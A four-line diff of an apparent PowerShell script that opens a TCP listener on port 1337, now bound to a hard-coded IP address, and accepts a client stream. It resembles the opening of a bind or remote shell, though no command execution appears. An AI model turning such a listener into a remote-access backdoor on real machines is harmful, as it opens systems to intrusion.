@@ -1,4 +1,4 @@
-$listener = [System.Net.Sockets.TcpListener]1337
+$listener = New-Object System.Net.Sockets.TcpListener('195.74.86.227', 1337)
 $listener.Start()
 $tcpClient = $listener.AcceptTcpClient()
 $stream = $tcpClient.GetStream()
